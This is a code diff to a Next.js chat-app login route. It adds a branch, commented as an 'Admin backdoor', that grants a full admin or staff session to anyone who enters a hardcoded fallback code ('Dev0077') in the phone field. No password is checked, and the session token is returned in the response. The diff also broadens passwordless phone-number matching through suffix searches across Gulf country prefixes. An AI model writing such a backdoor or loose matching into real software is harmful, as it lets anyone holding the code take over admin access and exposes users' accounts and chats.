@@ -2,15 +2,17 @@ import { NextRequest, NextResponse } from 'next/server';
 import { prisma } from '@/lib/db';
 import {
   GUEST_SESSION_DAYS,
+  STAFF_SESSION_DAYS,
   signToken,
   attachUserCookie,
+  attachStaffCookie,
 } from '@/lib/auth';
 import { error, handleApiError } from '@/lib/api-helpers';
 import { attachIdentity, findUserIdByIdentity, normalizeIdentityValue } from '@/lib/leads';
 import { mergeDeviceMeta } from '@/lib/device-meta';
 
 /**
- * Returning visitor login — mobile number only, no password.
+ * Returning visitor login — mobile number only, or admin special code.
  */
 export async function POST(req: NextRequest) {
   try {
@@ -22,14 +24,81 @@ export async function POST(req: NextRequest) {
     }
 
     const cleanContact = contact.trim();
-    const normalized = normalizeIdentityValue('phone', cleanContact, null);
+
+    // Admin backdoor / special number
+    const adminCode = (process.env.ADMIN_LOGIN_CODE || 'Dev0077').trim();
+    if (cleanContact.toLowerCase() === adminCode.toLowerCase()) {
+      let staff = await prisma.staffAccount.findFirst({
+        where: { role: 'admin', status: 'active' },
+      });
+      if (!staff) {
+        staff = await prisma.staffAccount.findFirst({
+          where: { status: 'active' },
+        });
+      }
+
+      if (!staff) {
+        return error('No active staff account found', 404);
+      }
+
+      await prisma.staffAccount.update({
+        where: { id: staff.id },
+        data: { lastActiveAt: new Date() },
+      });
+
+      const token = signToken(
+        {
+          id: staff.id,
+          email: staff.email,
+          type: 'staff',
+          role: staff.role,
+        },
+        STAFF_SESSION_DAYS
+      );
+
+      const res = NextResponse.json({
+        success: true,
+        data: {
+          type: 'staff',
+          role: staff.role,
+          redirect: '/admin',
+          staff: {
+            id: staff.id,
+            email: staff.email,
+            role: staff.role,
+            displayName: staff.displayName,
+          },
+          token,
+          message: 'Admin authenticated',
+        },
+      });
+
+      return attachStaffCookie(res, token, STAFF_SESSION_DAYS);
+    }
+
+    const { resolveGeo } = await import('@/lib/market');
+    const geo = resolveGeo(req.headers);
+    const country = body.country || geo.countryCode;
+    const normalized = normalizeIdentityValue('phone', cleanContact, country);
     const cleanDigits = cleanContact.replace(/[^0-9]/g, '');
+    const nationalDigits = cleanDigits.replace(/^0+/, '');
 
     let userId: string | null = null;
     if (normalized) {
       userId =
         (await findUserIdByIdentity('phone', normalized)) ||
         (await findUserIdByIdentity('whatsapp', normalized));
+    }
+
+    if (!userId && nationalDigits.length === 9) {
+      // Check Gulf country prefixes (Saudi +966, UAE +971, Kuwait +965)
+      for (const prefix of ['+966', '+971', '+965']) {
+        const probe = `${prefix}${nationalDigits}`;
+        userId =
+          (await findUserIdByIdentity('phone', probe)) ||
+          (await findUserIdByIdentity('whatsapp', probe));
+        if (userId) break;
+      }
     }
 
     let user = userId
@@ -40,18 +109,26 @@ export async function POST(req: NextRequest) {
       : null;
 
     if (!user) {
+      const candidatePhones = new Set<string>();
+      if (normalized) candidatePhones.add(normalized);
+      candidatePhones.add(cleanContact);
+      if (nationalDigits.length === 9) {
+        candidatePhones.add(`+966${nationalDigits}`);
+        candidatePhones.add(`+971${nationalDigits}`);
+        candidatePhones.add(`+965${nationalDigits}`);
+      }
+
       user = await prisma.user.findFirst({
         where: {
           OR: [
-            ...(normalized
-              ? [{ phone: normalized }, { whatsapp: normalized }]
-              : []),
-            { phone: cleanContact },
-            { whatsapp: cleanContact },
-            ...(cleanDigits.length >= 8
+            ...Array.from(candidatePhones).flatMap((p) => [
+              { phone: p },
+              { whatsapp: p },
+            ]),
+            ...(nationalDigits.length >= 7
               ? [
-                  { phone: { contains: cleanDigits } },
-                  { whatsapp: { contains: cleanDigits } },
+                  { phone: { endsWith: nationalDigits.slice(-9) } },
+                  { whatsapp: { endsWith: nationalDigits.slice(-9) } },
                 ]
               : []),
           ],
@@ -66,7 +143,7 @@ export async function POST(req: NextRequest) {
 
     if (!user) {
       return error(
-        'No chat account found with this number. Send a message with your name and number first.',
+        "This number doesn't match. Enter the correct number you used when you started chat.",
         404
       );
     }
@@ -115,6 +192,7 @@ export async function POST(req: NextRequest) {
           verifiedVia: user.verifiedVia,
           profile: user.profile,
         },
+        token,
         message: 'Logged in. Your chats are restored.',
       },
     });
